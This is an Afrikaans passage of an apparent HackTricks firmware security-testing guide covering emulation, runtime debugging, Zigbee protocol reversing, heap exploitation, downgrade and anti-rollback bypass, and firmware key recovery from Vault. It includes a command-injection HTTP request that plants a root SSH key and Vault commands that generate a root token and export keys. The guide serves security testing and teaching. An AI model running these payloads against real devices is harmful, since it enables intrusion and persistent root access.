4. Voer ’n onveranderde `unsquashfs` op die herboude beeld uit; suksesvolle deurkruising van alle gidse en fragmente is sterker bewys as `unsquashfs -stat`.

#### Ontleder-beheerde dm-verity-vervanging

Wanneer die ontleder die QEMU-kern, initramfs en virtuele skywe beheer, kan ’n gewysigde wortel selflaai deur die vervaardiger se verifikasie-PID 1 met ’n klein staties gekoppelde init te vervang. Dit is ’n **laboratoriumvervanging van die selflaaiketting**, nie ’n kraak van dm-verity, sy RSA-handtekening, Secure Boot of ’n TPM-verseëlde sleutel nie.<sup>[[11]](#references)</sup>

Die vervangende init behoort die operasionele dele van die oorspronklike selflaaipad na te boots: monteer `devtmpfs`, roep `setsid()` aan, koppel `/dev/console` aan lêerbeskrywers 0–2, monteer `/proc` en `/sys`, wag vir die verskafte bloktoestel, monteer die gewysigde wortel as leesalleen, ontkoppel die ou-wortel-pseudolêerstelsels, skuif die nuwe montering na `/`, voer `chroot` uit en roep `execve()` met die firmware se oorspronklike `/sbin/init` aan. Deur `/dev`, `/proc` en `/sys` **voor** `MS_MOVE` te ontkoppel, voorkom jy dat monteringspunte wat aan die nuwe wortel behoort, per ongeluk ontkoppel word.<sup>[[11]](#references)</sup>

Hou veranderlike toesteltoestand apart van die gewysigde onveranderlike wortel. ’n qcow2-overlay kan die oorspronklike skyf se LVM-toestand behou, terwyl ’n tweede leesalleen virtio-skyf die gewysigde SquashFS verskaf:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Ontfouting van vanlyn image-state

Inspekteer persistente toestand buite die gasstelsel wanneer stadige selflaaie, vernietigende opstartskripte of onbetroubare konsolelogging die fout verdoesel. Moet nooit ’n overlay koppel wat ’n VM gebruik terwyl dit loop nie; stel dit beskikbaar met `qemu-nbd`, beperk LVM-ontdekking tot die bedoelde NBD-partisie en deaktiveer die volumegroep voordat jy dit ontkoppel.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Vir herhaalbare foutisolering, skryf tydgestempelde merkerlêers na ’n stabiele skryfbare volume en verifieer hulle vanlyn; `/dev/kmsg`, FIFOs en tydelike konsoles kan vals negatiewe resultate oplewer weens tempobeperking of vroeë prosesbeëindiging. Vergelyk ook presiese koppelvlakke oor lae heen voordat jy onverwante kode verander: `uname -r` teenoor `/lib/modules/`, ext4-kenmerke op skyf teenoor kernkonfigurasie, en die Mesa `libGL`-generasie teenoor die DRI-bestuurder-ABI en PCI-afgeleide bestuurdername. ’n Komponent kan bestaan en selfs suksesvol met `dlopen()` gelaai word, maar steeds onbruikbaar wees omdat die verbruiker ’n ander ABI verwag.<sup>[[11]](#references)</sup>

## Dinamiese analise in die praktyk

Op hierdie stadium word ’n werklike of geëmuleerde toestelomgewing vir analise gebruik. Dit is noodsaaklik om doptoegang tot die bedryfstelsel en lêerstelsel te behou. Emulasie boots hardeware-interaksies dalk nie perfek na nie, wat dit soms nodig maak om die emulasie te herbegin. Die analise behoort die lêerstelsel weer te ondersoek, blootgestelde webblaaie en netwerkdienste te exploit en kwesbaarhede in die selflaaiprogram te verken. Firmware-integriteitstoetse is noodsaaklik om moontlike backdoor-kwesbaarhede te identifiseer.

## Tegnieke vir looptydanalise

Looptydanalise behels interaksie met ’n proses of binêre lêer in sy bedryfsomgewing. Gereedskap soos gdb-multiarch, Frida en Ghidra word gebruik om breekpunte te stel en kwesbaarhede deur fuzzing en ander tegnieke te identifiseer.

Vir ingebedde teikens sonder ’n volledige ontfouter, **kopieer ’n staties-gekoppelde `gdbserver`** na die toestel en koppel op afstand daaraan:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee / radio-co-processor-boodskapkartering

Op IoT-hubs word die RF-stack dikwels tussen ’n **radio-MCU** en ’n Linux-userland-proses verdeel. ’n Nuttige werkvloei is om die pad te karteer:<sup>[[8]](#references)</sup>

1. **RF-raam** oor die lug
2. **beheerderkant-ontleder** op die radio-MCU
3. **seriële/UART-teks- of TLV-protokol** wat na Linux aangestuur word (byvoorbeeld `/dev/tty*`)
4. **toepassingsdispatcher** in die hoofdemon
5. **protokolspesifieke handler / toestandsmasjien**

Hierdie argitektuur skep twee teikens vir reverse engineering in plaas van een. As die beheerder binêre radiograma in ’n teksprotokol soos `Group,Command,arg1,arg2,...` omskakel, herwin:

- Die **boodskapgroepe** en dispatch-tabelle
- Watter boodskappe van die **netwerk** teenoor die beheerder self kan kom
- Die presiese **vervaardigerspesifieke onderskeidingsvelde** (byvoorbeeld Zigbee se `manufacturer_code` en pasgemaakte `cluster_command`)
- Watter handlers slegs tydens **commissioning**, ontdekking of firmware-/modelaflaaifases bereikbaar is

Vir Zigbee spesifiek, neem paringverkeer op en kyk of die teiken steeds op die verstek-**Link Key** `ZigBeeAlliance09` staatmaak. Indien wel, kan die afluistering van commissioning-verkeer die **Network Key** blootlê. Zigbee 3.0-install codes verminder hierdie blootstelling; let dus op of die getoetste toestel dit werklik afdwing.

### Vervaardigerspesifieke protokolhandlers en FSM-beheerde bereikbaarheid

Vervaardigerspesifieke Zigbee/ZCL-opdragte is dikwels ’n beter teiken as gestandaardiseerde clusters, omdat hulle **pasgemaakte ontledingskode** en interne **FSM’s** voed met minder deeglik getoetste validering.<sup>[[8]](#references)</sup>

Praktiese werkvloei:

- Reverse-engineer die opdragdispatcher totdat jy die **slegs-vervaardiger-handler** vind.
- Herwin die **FSM-toestand**-, **gebeurtenis**-, **kontrole**-, **aksie**- en **volgende-toestand**-tabelle.
- Identifiseer **oorgangstoestande** wat outomaties voortgaan, asook herprobeer-/foutvertakkings wat uiteindelik aanvallerbeheerde toestand terugstel of vrystel.
- Bevestig watter legitieme protokoluitruilings nodig is om die daemon in die kwesbare toestand te plaas, eerder as om aan te neem dat die foutiewe handler altyd bereikbaar is.

Vir tydsensitiewe protokolle kan pakketherhaling vanaf ’n Python-raamwerk te stadig wees. ’n Betroubaarder benadering is om ’n legitieme toestel op werklike hardeware (byvoorbeeld ’n **nRF52840**) met ’n vervaardigervlak-stack na te boots, sodat jy die korrekte **eindpunte**, **eienskappe** en commissioning-tydsberekening kan blootstel.

### Foutklas vir gefragmenteerde aflaaie in ingebedde daemons

’n Herhalende firmware-foutklas kom voor in **gefragmenteerde blob-/model-/konfigurasie-aflaaie**:<sup>[[8]](#references)</sup>

1. Die **eerste fragment** (`offset == 0`) stoor `ctx->total_size` en ken `malloc(total_size)` toe.
2. Latere fragmente valideer slegs die aanvallerbeheerde **pakkieplaaslike** velde, soos `packet_total_size >= offset + chunk_len`.
3. Die kopie gebruik `memcpy(&ctx->buffer[offset], chunk, chunk_len)` sonder om dit teen die **oorspronklik toegekende grootte** te kontroleer.

Dit stel ’n aanvaller in staat om:

- ’n Geldige eerste fragment met ’n **klein** verklaarde totale grootte te stuur om ’n klein heap-toekenning af te dwing.
- ’n Latere fragment met die **verwagte offset**, maar ’n groter `chunk_len`, te stuur.
- ’n vervalste pakkieplaaslike grootte te gebruik wat aan die nuwe kontroles voldoen, maar steeds die oorspronklik toegekende buffer oorloop.

Wanneer die kwesbare pad agter commissioning-logika sit, moet die uitbuiting genoeg **toestelnabootsing** insluit om die teiken in die verwagte modelaflaai- of blobaflaaitoestand te plaas voordat die vervalste fragmente gestuur word.

### Protokolgedrewe `free()`-snellers

In ingebedde daemons is die maklikste manier om heap-metadata-uitbuiting te aktiveer dikwels nie “wag vir skoonmaak” nie, maar om **die protokol se eie foutafhandeling af te dwing**:<sup>[[8]](#references)</sup>

- Stuur foutiewe opvolgfragmente om die FSM na **herprobeer-** of **fouttoestande** te stuur.
- Oorskry die herprobeerdrempel sodat die daemon **konteks terugstel** en die beskadigde buffer vrystel.
- Gebruik hierdie voorspelbare `free()` om allocator-kant-primitiewe te aktiveer voordat die proses om onverwante redes ineenstort.

Dit is veral nuttig teen **musl/uClibc/dlmalloc-agtige** allocators in ingebedde Linux, waar die beskadiging van chunk-metadata unlink-/unbin-logika in ’n skryfprimitief kan omskep. ’n Stabiele patroon is om ’n **grootteveld** te beskadig om allocator-deurloop na **vals chunks wat binne die oorstroomde buffer geplaas is** te herlei, in plaas daarvan om werklike bin-wysers onmiddellik te beskadig en die proses te laat ineenstort.

## Binêre uitbuiting en bewys-van-konsep

Die ontwikkeling van ’n PoC vir geïdentifiseerde kwesbaarhede vereis ’n diep begrip van die teikenargitektuur en programmering in laervlaktale. Binêre looptydbeskermings is skaars in ingebedde stelsels, maar wanneer hulle wel voorkom, kan tegnieke soos Return Oriented Programming (ROP) nodig wees.

### uClibc-fastbin-uitbuitingsaantekeninge (ingebedde Linux)

- **Fastbins + konsolidasie:** uClibc gebruik fastbins soortgelyk aan glibc. ’n Latere groot toekenning kan `__malloc_consolidate()` aktiveer, dus moet enige vals chunk kontroles slaag (redelike grootte, `fd = 0` en omliggende chunks wat as “in gebruik” beskou word).<sup>[[6]](#references)</sup>
- **Nie-PIE-binaries onder ASLR:** as ASLR geaktiveer is, maar die hoofbinêre lêer **nie-PIE** is, is adresse in `.data/.bss` binne die binêre lêer stabiel. Jy kan ’n gebied teiken wat reeds soos ’n geldige heap-chunk-opskrif lyk, om ’n fastbin-toekenning op ’n **funksiewysertabel** te laat beland.
- **NUL wat die ontleder stop:** wanneer JSON ontleed word, kan ’n `\x00` in die payload die ontleding stop terwyl die daaropvolgende aanvallerbeheerde grepe vir ’n stapelspil/ROP-ketting behoue bly.
- **Shellcode via `/proc/self/mem`:** ’n ROP-ketting wat `open("/proc/self/mem")`, `lseek()` en `write()` aanroep, kan uitvoerbare shellcode in ’n bekende kartering plaas en daarheen spring.

## Voorbereide bedryfstelsels vir firmware-analise

Bedryfstelsels soos [AttifyOS](https://github.com/adi0x90/attifyos) en [EmbedOS](https://github.com/scriptingxss/EmbedOS) bied vooraf gekonfigureerde omgewings vir firmware-sekuriteitstoetsing, toegerus met die nodige nutsmiddels.

## Voorbereide bedryfstelsels om firmware te ontleed

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS is ’n distro wat bedoel is om jou te help met sekuriteitsassessering en penetrasietoetsing van Internet of Things (IoT)-toestelle. Dit spaar jou baie tyd deur ’n vooraf gekonfigureerde omgewing met al die nodige nutsmiddels beskikbaar te stel.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): ’n Bedryfstelsel vir ingebedde sekuriteitstoetsing, gebaseer op Ubuntu 18.04 en vooraf gelaai met nutsmiddels vir firmware-sekuriteitstoetsing.

## Firmware-afgraderingsaanvalle en onveilige opdateringsmeganismes

Selfs wanneer ’n vervaardiger kriptografiese handtekeningkontroles vir firmwarebeelde implementeer, word **beskerming teen weergawe-terugrol (afgradering)** dikwels weggelaat. Wanneer die selflaai- of herstellaaier slegs die handtekening met ’n ingebedde publieke sleutel verifieer, maar nie die *weergawe* (of ’n monotone teller) van die beeld wat geflits word vergelyk nie, kan ’n aanvaller wettiglik ’n **ouer, kwesbare firmware met ’n geldige handtekening** installeer en sodoende reggemaakte kwesbaarhede weer invoer.<sup>[[4]](#references)</sup>

Tipiese aanvalwerkvloei:

1. **Kry ’n ouer, ondertekende beeld**
   * Laai dit van die vervaardiger se openbare aflaaipoortaal, CDN of ondersteuningswerf af.
   * Onttrek dit uit gepaardgaande mobiele-/lessenaartoepassings (bv. binne ’n Android-APK onder `assets/firmware/`).
   * Haal dit van derdepartybewaarplekke soos VirusTotal, Internet-argiewe, forums, ens. af.
2. **Laai die beeld op na of bedien dit aan die toestel** via enige blootgestelde opdateringskanaal:
   * Web-UI, mobieletoepassing-API, USB, TFTP, MQTT, ens.
   * Baie IoT-toestelle vir verbruikersgebruik stel *ongeverifieerde* HTTP(S)-eindpunte bloot wat Base64-geënkodeerde firmwareblobs aanvaar, dit aan die bedienerkant dekodeer en herstel/opgradering aktiveer.
3. Na die afgradering, buit ’n kwesbaarheid uit wat in die nuwer weergawe reggemaak is (byvoorbeeld ’n opdraginspuitingsfilter wat later bygevoeg is).
4. Flits opsioneel die nuutste beeld terug of deaktiveer opdaterings om opsporing te vermy sodra volharding verkry is.

### Voorbeeld: Opdraginspuiting ná afgradering

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

In die kwesbare (na ’n ouer weergawe teruggesette) firmware word die `md5`-parameter direk sonder sanitisering by ’n shell command gevoeg, wat inspuiting van arbitrêre opdragte moontlik maak (hier gebruik om SSH-toegang as root met ’n sleutel te aktiveer). Latere firmwareweergawes het ’n basiese karakterfilter bygevoeg, maar omdat daar geen beskerming teen terugstelling na ’n ouer weergawe is nie, is die regstelling nutteloos.<sup>[[4]](#references)</sup>

### Firmware uit mobiele apps onttrek

Baie verskaffers sluit volledige firmwarebeelde in hul gepaardgaande mobiele toepassings in, sodat die toepassing die toestel via Bluetooth/Wi-Fi kan opdateer. Hierdie pakkette word gewoonlik ongeënkripteer in die APK/APEX gestoor, onder paaie soos `assets/fw/` of `res/raw/`. Met nutsgoed soos `apktool`, `ghidra` of selfs gewone `unzip` kan jy getekende beelde onttrek sonder om aan die fisiese hardeware te raak.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Omseiling van anti-rollback wat slegs in die updater voorkom, in A/B-slotontwerpe

Sommige verskaffers implementeer wel ’n anti-downgrade-**ratchet**, maar slegs binne die *updater*-logika (byvoorbeeld ’n UDS-roetine oor CAN, ’n herstelopdrag of ’n userspace OTA-agent). As die **bootloader** later net die beeldhandtekening/CRC nagaan en die partisietabel of slotmetadata vertrou, kan rollback-beskerming steeds omseil word.<sup>[[7]](#references)</sup>

Tipiese swak ontwerp:

- Firmwaremetadata bevat beide ’n weergawesbeskrywer en ’n **security ratchet** / monotone teller.
- Die updater vergelyk die beeld se ratchet met ’n waarde wat in persistente berging gestoor is en verwerp ouer ondertekende beelde.
- Die bootloader **ontleed nie** daardie ratchet nie en verifieer slegs die kopskrif, CRC en handtekening voordat dit die gekose slot begin.
- Slotaktivering word afsonderlik in ’n partisietabel of generasieteller per slot gestoor en is **nie kriptografies gekoppel** aan die presiese firmwaredigest wat gevalideer is nie.

Dit skep ’n **valideer-een-beeld / begin-’n-ander-beeld**-primitief in dubbelslotsisteme. As die aanvaller die updater kan laat merk dat slot B die volgende teiken vir opstart is deur ’n huidige ondertekende beeld te gebruik, en slot B later voor die herlaai kan oorskryf, kan die bootloader steeds die afgegradeerde beeld begin omdat dit slegs die reeds vasgelegde slotmetadata vertrou.

Algemene misbruikpatroon:

1. Laai huidige **ondertekende** firmware na die passiewe slot op en voer die normale validerings-/wisselroetine uit sodat die uitleg daardie slot as die volgende aktiewe slot merk.
2. **Moenie nog herlaai nie**. Voer die slotvoorbereidings-/uitveeroetine weer in dieselfde sessie uit.
3. Misbruik verouderde opstarttoestand- of slotkeuse-logika sodat die updater **dieselfde fisiese slot** uitvee wat pas bevorder is.
4. Skryf ’n **ouer maar steeds ondertekende** firmware na daardie slot.
5. Slaan die valideringsroetine wat die ratchet afdwing oor en herlaai direk.
6. Die bootloader kies die bevorderde slot, verifieer slegs die handtekening/integriteit en begin die ou beeld.

Dinge om na te kyk wanneer jy A/B-opdateringsimplementasies reverse-engineer:

- Slotkeuse wat afgelei word van **opstartvlae** wat nie ná ’n suksesvolle wissel verfris word nie.
- ’n `prepare_passive_slot()`-agtige roetine wat ’n slot uitvee op grond van verouderde toestand eerder as die **huidige vasgelegde uitleg**.
- ’n `part_write_layout()`-agtige funksie wat slegs ’n **generasieteller** / aktiewe vlag verhoog en nie die hash van die gevalideerde beeld stoor nie.
- Ratchet-kontroles wat in userspace- of updater-kode geïmplementeer is, maar **nie** in ROM- / bootloader- / secure boot-fases nie.
- Uitvee- of herstelroetines wat die slot as opstartbaar gemerk laat, selfs nadat die inhoud daarvan verwyder en herskryf is.

### Kontrolelys vir die beoordeling van opdateringslogika

* Is die vervoer/verifikasie van die *update endpoint* voldoende beskerm (TLS + verifikasie)?
* Vergelyk die toestel **weergawenommers** of ’n **monotone anti-rollback-teller** voordat dit flits?
* Word die beeld binne ’n secure boot-ketting geverifieer (bv. handtekeninge wat deur ROM-kode nagegaan word)?
* Dwing die **bootloader dieselfde ratchet** as die updater af, in plaas daarvan om slegs die handtekening/CRC na te gaan?
* Is slotaktiveringsmetadata **gekoppel aan die gevalideerde firmwaredigest/-weergawe**, of kan ’n slot ná bevordering gewysig word?
* Word die toestel verplig om te herlaai nadat ’n slotwissel slaag, of is latere opdaterings-/uitveerroetines steeds in dieselfde sessie bereikbaar?
* Voer userland-kode bykomende gesonde-verstand-kontroles uit (bv. toegelate partisietoewysing, modelnommer)?
* Hergebruik *gedeeltelike* of *rugsteun*-opdateringsvloei dieselfde valideringslogika?

> 💡  As enige van die bogenoemde ontbreek, is die platform waarskynlik kwesbaar vir rollback-aanvalle.

## Kwesbare firmware om mee te oefen

Gebruik die volgende kwesbare firmwareprojekte as ’n beginpunt om te oefen om kwesbaarhede in firmware te ontdek.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Herwinning van firmware-dekripsiesleutels uit ingebedde KMS/Vault-toestand

Wanneer ’n opdateringsbeeld klein gewone-teks-metadata met ’n groot hoë-entropie-blob kombineer, doen houertriage voordat jy enigiets brute-force:<sup>[[1]](#references)</sup>

- Dump kopskrifte, offsette en reëlgrense met `hexdump`, `xxd`, `strings -tx`, `base64 -d` en `binwalk -E`.
- `Salted__` beteken gewoonlik OpenSSL `enc`-formaat: die volgende 8 grepe is die sout en die oorblywende grepe is syferteks.
- ’n Base64-veld wat na presies `256` grepe dekodeer, is ’n sterk leidraad dat jy na RSA-2048-syferteks kyk wat ’n ewekansige firmwarewagwoord/sessiesleutel verpak.
- Afsonderlike PGP-materiaal in dieselfde lêer beskerm dikwels slegs egtheid; moenie aanvaar dat dit die vertroulikheidsmeganisme is nie.

As statiese sleutelsoektogte (`grep`, `strings`, PEM/PGP-soektogte) misluk, reverse-engineer eerder die **operasionele dekripteerpad** as om slegs na private sleutels te soek:

- Decompileer die updater-/bestuursbinary en volg wie die geënkripteerde blob lees, watter helper/API dit ontseël en watter logiese sleutelnaam dit aanvra.
- Soek in die onttrekte wortellêerstelsel na KMS-toestand (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), plus eenheidslêers en init-skripte.
- Behandel gewone-teks `vault operator unseal ...`, herstelsleutels, bootstrap-tokens of plaaslike KMS outomatiese-ontseëlingskripte as ekwivalent aan private-sleutelmateriaal.

As die toestel die oorspronklike Vault-binary en bergingbackend insluit, is dit gewoonlik makliker om daardie omgewing te herspeel as om Vault-internals te herimplementeer:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Met root-toegang op die gekloonde KMS:

- Maak transit-sleutels slegs binne die geïsoleerde kloon uitvoerbaar: `vault write transit/keys/<name>/config exportable=true`
- Voer die unwrap-sleutel uit: `vault read transit/export/encryption-key/<name>`
- Probeer die herwonne RSA-sleutel met die presiese opvullings-/hash-paar wat die KMS gebruik. ’n Mislukte PKCS#1 v1.5-dekripsie en ’n mislukte verstek-OAEP-dekripsie bewys **nie** dat die sleutel verkeerd is nie; baie Vault-gebaseerde vloeie gebruik OAEP met SHA-256, terwyl algemene biblioteke SHA-1 as verstek gebruik.
- As die loonvrag met `Salted__` begin, reproduseer die verskaffer se OpenSSL-KDF presies (`EVP_BytesToKey`, dikwels MD5 op verouderde toestelle) voordat jy AES-CBC-dekripsie probeer.

Dit verander "geënkripteerde firmware" in ’n meer algemene probleem: **herwin die toestel se operasionele sleutels, en reproduseer dan die presiese unwrap- en KDF-parameters vanlyn**.

## Opleiding en Sertifisering

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Kraak firmware met Claude: vaardigheid op seniorvlak, outonomie op juniorvlak](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Metodologie vir firmware-sekuriteitstoetsing](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Praktiese IoT-hacking: Die definitiewe gids vir aanvalle op die Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Benutting van zero-days in verlate hardeware – Trail of Bits-blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Hoe ’n slimtoestel van $20 my toegang tot jou huis gegee het](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Nou sien jy mi: nou is jy pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Benutting van die Tesla Wall Connector via sy laaipoort-aansluiting - Deel 2: omseiling van die anti-afgraderingbeskerming](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Laat dit flikker: Oor-die-lug-benutting van die Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS op QEMU Deel 1: Uitpak](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Linux-kerneldokumentasie - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [ROOT Tesla OS op QEMU Deel 2: Ontfouting en regstelling](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Dell BIOS-wagwoorde: Swak XOR-enkripsie maak herstel vanaf SPI-flitsgeheue moontlik (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Nutsgoed vir Dell BIOS-wagwoordherwinning](https://github.com/R3n5k1/dellpwn)
- [14] [VoidStar Security — ’n Opknapping van hardeware-hacking, Deel 2](https://voidstarsec.com/blog/brushing-up-part-2)
- [15] [Hoe en waarom ons die Cypherock-hardewarebeursie gehack het: die volledige verhaal](https://www.darknavy.org/blog/how_and_why_we_hacked_cypherock_hardware_wallet_the_full_story/)
{{#include ../../banners/hacktricks-training.md}}
